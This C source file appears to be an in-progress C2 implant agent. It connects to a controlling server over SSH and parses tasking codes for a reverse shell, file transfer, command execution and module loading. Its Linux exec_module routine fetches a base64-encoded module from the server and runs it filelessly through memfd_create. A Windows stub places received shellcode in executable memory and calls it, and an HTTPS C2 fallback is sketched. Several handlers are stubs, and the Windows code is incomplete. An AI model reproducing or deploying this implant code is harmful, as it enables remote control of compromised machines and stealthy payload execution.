#include "agent.h"
#include "config.h"
#include "b64.h"

// Agent in-memory execution definitions
#ifdef _WIN32
#define strncasecmp _strnicmp
int exec_module(ssh_session session, char *module){
	ULONG32 payload_size;
    char * alloc_mem_ptr;
    int i;
    void (*func_ptr)();
    
    // Tests connection
    //int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
    
    //if (sock_count != 4 || payload_size <= 0) 
      //  cleanup_sockets(remote_sock);
    
    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (alloc_mem_ptr == NULL) 
        return -1;
        
    alloc_mem_ptr[0] = 0xBF;
    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);

	int rc=0;
    int count=0;
    void * startb = alloc_mem_ptr + 5;
    while (count < payload_size) {
        //rc = recv(sock, (char *)startb, size_of - count, 0);
        startb += rc; 
        count += rc;
        if (rc == SOCKET_ERROR) 
            return -1;
    }

    func_ptr = (void (*)())alloc_mem_ptr;
    func_ptr();
}
#include <winsock.h>
#else
#define _GNU_SOURCE
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/wait.h>

int do_exec(char *buff, int size){
    pid_t child;

// Create anon FD
    int fd;
    fd = memfd_create("", 1U); // MFD_CLOEXEC
    write(fd, buff, size);
    char *p;
    asprintf(&p, "/proc/self/fd/%i", fd);
    
// fork to background
    child = fork();
    if (child == 0)
    {
        execlp(p, "example", NULL);
        perror("execution error");
        exit(EXIT_FAILURE);
    }
    else if (child == -1)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }

// Wait and exit
    waitpid(child, NULL, 0);
    return 0;
}

int exec_module(ssh_channel channel, char *module){
	int rc = 0;
	int nbytes = 0;
	char buffr[128];
	
	memset(buffr, 0, sizeof(buffr));
	sprintf(buffr, "10%s", module);
	
	printf("Downloading module...\n");
	rc = ssh_channel_write(channel, buffr, strlen(buffr));
	if (rc == SSH_ERROR)
  	{
		printf("Write to channel failed\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}
	
	memset(buffr, 0, sizeof(buffr));
	nbytes = ssh_channel_read(channel, buffr, sizeof(buffr), 0);
	puts("Read Data from channel\n");
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}	

	printf("Received size: %s\n", buffr);
	
	rc = ssh_channel_write(channel, "0", 1);
	printf("Wrote data to channel\n");
	if (rc == SSH_ERROR){
		printf("caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}

	int size = atoi(buffr);

	char *buff = malloc(size);
	memset(buff, 0, size);

	printf("Getting executable contents with size %d\n", size);
	rc = ssh_channel_read(channel, buff, size, 0);

	printf("Decoding Data blob\n");
	int finSize = b64_decoded_size(buff);
	char *ptr = malloc(finSize);

	if(!b64_decode(buff, (unsigned char *)ptr, finSize)){
		printf("Decode failure\n");
		return SSH_ERROR;
	}

	printf("Doing execution\n");
	do_exec(ptr, size);
	return 0;
}
#endif






struct tasking_struct{
	int operation;
	char *opts;
};

int func_loop(ssh_session session)
{
	/* Primary function loop */
	// Initialize vars
  	ssh_channel channel;
  	int rc;
  	char tasking[2048];
	int nbytes;
	channel = ssh_channel_new(session);

	printf("[+] Created new SSH channel\n");
  	if (channel == NULL)
    	return SSH_ERROR;

	// Open channel
  	rc = ssh_channel_open_session(channel);
	printf("[+] Opened SSH Channel with remote server\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(channel);
    	return rc;
  	}

	// Request a shell interface
  	rc = ssh_channel_request_shell(channel);
	
	printf("[ ] Sent request for shell\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
  	}
	printf("[+] Made it through check\n");

	// Begin the meat of the stuff


	// Send the global ID
	rc = ssh_channel_write(channel, GLOB_ID, strlen(GLOB_ID));

	printf("Wrote ID to channel\n");
		
	if (rc == SSH_ERROR){
		printf("caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}

	
	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
	printf("read %d bytes from channel\n", nbytes);
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}		

	printf("Read data: %s\n", tasking);
	parse_tasking(tasking, channel);
	
	  // close connections
	ssh_channel_write(channel, "\0", 2);

  	ssh_channel_send_eof(channel);
  	ssh_channel_close(channel);
  	ssh_channel_free(channel);
  	return SSH_OK;
}

int parse_tasking(char *tasking, ssh_channel chan){
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if(!strcmp(tasking, "NULL :)\n")){
		printf("No tasking available. Quitting...\n");
		ssh_channel_write(chan, "\0", 2);
		return 1;
	}


	// get the number of instructions to complete
	int num = 0;
	char *tmp = tasking;
	for (; tasking[num]; tasking[num]=='\n' ? num++ : *tasking++);
	tasking = tmp;
	printf("Number of tasks to do: %d\n", num);
	struct tasking_struct tasking_arr[num];

	char *p = strtok(tasking, "\n");
	printf("Filling the structure array\n");
	
	// Parses the data into structure array
	int i = 0;
	while(p != NULL)
	{
		// get operation int
		char tmpbf[2];
		strncat(tmpbf, p, 2);
		tasking_arr[i].operation = atoi(tmpbf);

		// get options for operation
		int sz = strlen(p+3);
		char *dat = malloc(sz);
		memset(dat, 0, sz);
		strcat(dat, p+3);
		tasking_arr[i].opts = dat;

		// clean up and move on
		p = strtok(NULL, "\n");
		memset(tmpbf, 0, 2);
		i++;
	}

	int rc = 0;
	for(int j = 0; j < num; j++){
		switch(tasking_arr[j].operation)
		{
		case AGENT_DOWN_FILE:
			printf("Got tasking to download file %s\n", tasking_arr[j].opts);
			//rc = download(tasking_arr[j].opts);
			//ssh_channel_write(chan, )
			break;
		case AGENT_REV_SHELL:
			printf("Got tasking to start reverse shell\n");
			break;
		case AGENT_UP_FILE:
			printf("Got tasking to upload file %s\n", tasking_arr[j].opts);
			break;
		case AGENT_EXEC_SC:
			printf("Got tasking to execute command %s\n", tasking_arr[j].opts);
			break;
		case AGENT_EXEC_MODULE:
			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
			rc = exec_module(chan, tasking_arr[j].opts);
			
			break;

		case AGENT_EXIT:
			printf("Got agent exit request\n");
			break;

		default:
			printf("Caught unknown tasking value: %d\n", tasking_arr[j].operation);
			break;
		}
	
	}
	return 0;
}

void get_tasking_https(){
	// Test thing for HTTPS C2 infrastructure, in case of SSH being blocked/filtered
	CURL *curl;
  	CURLcode res;

  	curl_global_init(CURL_GLOBAL_DEFAULT);

  	curl = curl_easy_init();
  	if(curl) {
    	curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");

#ifdef SKIP_PEER_VERIFICATION
    /*
     * If you want to connect to a site who isn't using a certificate that is
     * signed by one of the certs in the CA bundle you have, you can skip the
     * verification of the server's certificate. This makes the connection
     * A LOT LESS SECURE.
     *
     * If you have a CA cert for the server stored someplace else than in the
     * default bundle, then the CURLOPT_CAPATH option might come handy for
     * you.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
#endif

#ifdef SKIP_HOSTNAME_VERIFICATION
    /*
     * If the site you're connecting to uses a different host name that what
     * they have mentioned in their server certificate's commonName (or
     * subjectAltName) fields, libcurl will refuse to connect. You can skip
     * this check, but this will make the connection less secure.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif

    	/* Perform the request, res will get the return code */
    	res = curl_easy_perform(curl);
    	/* Check for errors */
    	if(res != CURLE_OK)
      		fprintf(stderr, "curl_easy_perform() failed: %s\n",
    				curl_easy_strerror(res));

    	/* always cleanup */
    	curl_easy_cleanup(curl);
  	}

  	curl_global_cleanup();
}